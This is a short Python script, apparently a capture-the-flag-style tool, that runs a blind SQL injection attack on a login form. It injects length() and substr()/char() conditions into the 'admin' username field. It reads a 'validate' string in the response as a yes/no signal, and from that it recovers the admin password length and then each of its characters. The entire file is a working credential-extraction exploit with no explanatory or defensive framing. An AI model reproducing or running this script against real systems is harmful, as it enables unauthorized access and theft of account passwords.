#!/usr/bin/env python

'''
Name : SQLi_Blind.py
@Skadiia
'''

import requests
import re

host = ""

def search_lenght():
    for l in range(24):
        data = {"username":"admin' AND length(password)="+str(l)+" --", "password":"PWND"}
        r = requests.post(host, data=data)
        res = re.search('validate', r.text)
        if res != None:
            print "FOUND ! The password lenght is " + str(l)
            return l
            break
        else:
            continue
    print "Unable to find password lenght"

def search_pass(l):
    i = 1
    pwd = ""
    while i <= l:
        print "Testing password pos : "+str(i)
        for n in range(128):
            data = {"username":"admin' AND substr(password,"+str(i)+",1)=char("+str(n)+") --", "password":"PWND"}
            r = requests.post(host, data=data)
            res = re.search('validate', r.text)
            if res != None:
                print "FOUND ! "+str(i)+" character successfully !"
                pwd += chr(n)
        i +=1
    return pwd

def main():
    l = search_lenght()
    pwd = search_pass(l)
    print "Admin password is : "+pwd

if __name__ == '__main__':
    main()
